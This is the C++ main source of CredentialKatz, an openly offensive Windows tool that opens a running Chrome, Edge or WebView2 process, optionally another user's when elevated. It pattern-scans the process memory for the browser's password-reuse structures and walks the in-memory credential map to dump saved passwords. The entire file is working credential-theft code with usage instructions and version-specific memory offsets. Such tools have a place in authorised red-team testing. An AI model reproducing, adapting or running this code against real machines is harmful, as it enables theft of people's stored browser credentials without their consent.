#include <stdio.h>
#include <Windows.h>
#include <shlwapi.h>

#include "Helper.h"
#include "Process.h"
#include "Memory.h"
#include "Version.h"

void banner() { //This is important
    printf("  _____              _            _   _       _ _  __     _       \n");
    printf(" / ____|            | |          | | (_)     | | |/ /    | |      \n");
    printf("| |     _ __ ___  __| | ___ _ __ | |_ _  __ _| | ' / __ _| |_ ____\n");
    printf("| |    | '__/ _ \\/ _` |/ _ \\ '_ \\| __| |/ _` | |  < / _` | __|_  /\n");
    printf("| |____| | |  __/ (_| |  __/ | | | |_| | (_| | | . \\ (_| | |_ / / \n");
    printf(" \\_____|_|  \\___|\\__,_|\\___|_| |_|\\__|_|\\__,_|_|_|\\_\\__,_|\\__/___|\n");
    printf("By Meckazin                                  github.com / Meckazin \n");
};

void usage() {
    printf("Help!\n\n");
    printf("Examples:\n");
    printf(".\\CredentialKatz.exe\n");
    printf("    By default targets first available Chrome process\n");
    printf(".\\CredentialKatz.exe /edge\n");
    printf("    Targets first available Edge process\n");
    printf(".\\CredentialKatz.exe /pid:<pid>\n");
    printf("    Attempts to target given pid, expecting it to be Chrome\n");
    printf(".\\CredentialKatz.exe /edge /pid:<pid>\n");
    printf("    Target the specified Edge process\n");
    printf("\n");
    printf("Flags:\n");
    printf("    /edge       Target current user Edge process\n");
    printf("    /pid        Attempt to dump given pid, for example, someone else's if running elevated\n");
    printf("    /list       List targettable processes, use with /edge to list Edge processes\n");
    printf("    /help       This what you just did! -h works as well\n");
}

#pragma comment(lib,"shlwapi.lib")
int main(int argc, char* argv[]) {
    banner();
	printf("Don't use your cat's name as a password!\n\n");

#ifndef _WIN64
    printf("[-] 32bit version is not currently supported.\n");
    return 1;
#endif // !_WIN64

    TargetVersion targetConfig = Chrome;
    BOOL ProcessList = FALSE;
    DWORD pid = 0;

    //Jump over the program name
    for (size_t i = 1; i < argc; i++)
    {
        if (StrStrIA(argv[i], "pid:") != NULL)
        {
            //Split and take pid
            const char* colonPos = strchr(argv[i], ':');
            size_t pidLen = strlen(colonPos + 1);
            char* remainder = new char[pidLen + 1];
            strcpy_s(remainder, pidLen + 1, colonPos + 1);
            if (sscanf_s(remainder, "%lu", &pid) == 0) {
                printf("[-] Failed to parse command line argument /pid!");
                return 1;
            }
        }
        if (StrStrIA(argv[i], "edge") != NULL)
            targetConfig = Edge;
        if (StrStrIA(argv[i], "webview") != NULL)
            targetConfig = Webview2;
        if (StrStrIA(argv[i], "list") != NULL)
            ProcessList = TRUE;
        if (StrStrIA(argv[i], "help") != NULL || StrStrIA(argv[i], "-h") != NULL) {
            usage();
            return 0;
        }
    }


    LPCWSTR targetProcess = L"\0";
    LPCWSTR targetDll = L"\0";

    if (targetConfig == Chrome)
    {
        PRINT("[*] Targeting Chrome\n");
        targetProcess = L"chrome.exe";
        targetDll = L"chrome.dll";
    }
    else if (targetConfig == Edge)
    {
        if (targetConfig == Webview2) {
            PRINT("[*] Targeting Webview2\n");
            targetProcess = L"msedgewebview2.exe";
            targetDll = L"msedge.dll";
        }
        else {
            PRINT("[*] Targeting Edge\n");
            targetProcess = L"msedge.exe";
            targetDll = L"msedge.dll";
        }
    }
    else {
        PRINT("[-] Unknown config\n");
        return 0;
    }

    if (ProcessList)
    {
        PRINT("[*] Listing targetable processes\n");
        FindAllSuitableProcesses(targetProcess);
        PRINT("[+] Done\n");
        return 0;
    }

    HANDLE hProcess = NULL;

    if (pid != 0)
    {
        if (!GetProcessHandle(pid, &hProcess))
        {
            PRINT("[-] Failed to get process handle to PID: %lu\n", pid);
            return 1;
        }
        if (!GetProcessName(hProcess, targetProcess))
        {
            PRINT("[-] Failed to get process handle to PID: %lu\n", pid);
            return 1;
        }

        if (IsWow64(hProcess))
        {
            PRINT("[-] Target process is 32bit. Only 64bit browsers are supported!\n");
            CloseHandle(hProcess);
            return 1;
        }

        PRINT("[*] Targeting process: %ls on PID: %lu\n", targetProcess, pid);
    }

    //If pid was not given, now we go and find the process and handle
    if (pid == 0)
    {
        if (!FindCorrectProcessPID(targetProcess, &pid, &hProcess) || hProcess == NULL)
        {
            PRINT("[-] Failed to find right process\n");
            return 1;
        }

        if (IsWow64(hProcess))
        {
            PRINT("[-] Target process is 32bit. Only 64bit browsers are supported!\n");
            CloseHandle(hProcess);
            return 1;
        }
    }
#ifdef _DEBUG
    PRINT("[*] Targeting process PID: %d\n", pid);
#endif

    //Working versions
    // 122.0.6260.0 >= Chrome
    // XXX.X.XXXX.X >= Edge ?? Hard to test
    BrowserVersion browserVersion = { 0 };
    if (!GetBrowserVersion(hProcess, browserVersion)) {
        PRINT("[-] Failed to determine browser version!\n");
        return 0;
    }

    //Update config based on target version
    if (targetConfig == Chrome) {
        if ((browserVersion.highMajor == 122 && browserVersion.highMinor <= 6260) ||
            (browserVersion.highMajor < 122)) {
            PRINT("[-] This browser version is not supported!\n");
            return 0;
        }
    }
    else if (targetConfig == Edge || targetConfig == Webview2) {
        if ((browserVersion.highMajor == 122 && browserVersion.highMinor <= 6260) ||
            (browserVersion.highMajor < 122)) { //Honestly no idea, these haven't been tested
            PRINT("[-] This browser version is not supported!\n");
            return 0;
        }
    }

    //One pattern to rule them all
    size_t szPattern = 176;
    BYTE pattern[] = {
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    uintptr_t chromeDlladdress = 0;
    DWORD modulesize = 0;
    if (!GetRemoteModuleBaseAddress(hProcess, targetDll, chromeDlladdress, &modulesize))
    {
        PRINT("[-] Failed to find target DLL\n");
        CloseHandle(hProcess);
        return 0;
    }

#ifdef _DEBUG
    PRINTW(L"[+] Found %ls in address: 0x%p\n", targetDll, (void*)chromeDlladdress);
#endif
    uintptr_t targetSection = 0;
    if (!FindLargestSection(hProcess, chromeDlladdress, targetSection)) {
        PRINT("[-] Something went wrong");
        CloseHandle(hProcess);
        return 0;
    }

#ifdef _DEBUG
    PRINTW(L"[+] Found target region in section: 0x%p\n", (void*)targetSection);
#endif
    BYTE chromeDllPattern[sizeof(uintptr_t)];
    ConvertToByteArray(targetSection, chromeDllPattern, sizeof(uintptr_t));

    //Patch in the base address
    PatchPattern(pattern, chromeDllPattern, 8);

    uintptr_t* PasswordReuseDetectorInstances = (uintptr_t*)malloc(sizeof(uintptr_t) * 100); //There is no person with computer RAM enough to run more than 100 chrome instances :D
    size_t szPasswordReuseDetectorInstances = 0;
    if (PasswordReuseDetectorInstances == NULL || !FindPattern(hProcess, pattern, szPattern, PasswordReuseDetectorInstances, szPasswordReuseDetectorInstances)) {
        PRINT("[-] Failed to find pattern!\n");
        CloseHandle(hProcess);
        free(PasswordReuseDetectorInstances);
        return 1;
    }

    PRINT("[*] Found %Iu instances of CredentialMap!\n", szPasswordReuseDetectorInstances);
#ifdef _DEBUG
    for (size_t i = 0; i < szPasswordReuseDetectorInstances; i++)
        PRINTW(TEXT("[*] Found PasswordReuseDetector on 0x%p\n"), (void*)PasswordReuseDetectorInstances[i]);
#endif
    //There should really be one instance, but might be more if more windows are created?
    for (size_t i = 0; i < szPasswordReuseDetectorInstances; i++)
    {
        if (szPasswordReuseDetectorInstances == NULL || PasswordReuseDetectorInstances[i] == NULL)
            break;

        uintptr_t CredentialMapOffset = 0x18; //Offset to passwords_with_matching_reused_credentials_ 0x20 for my own debug build
        CredentialMapOffset += PasswordReuseDetectorInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
#ifdef _DEBUG
        PRINTW(TEXT("[*] CredentialMap should be found in address 0x%p\n"), (void*)CredentialMapOffset);
#endif
        WalkCredentialMap(hProcess, CredentialMapOffset);
    }

    CloseHandle(hProcess);
    free(PasswordReuseDetectorInstances);

    PRINT("\n[+] Done\n");
    return 0;
}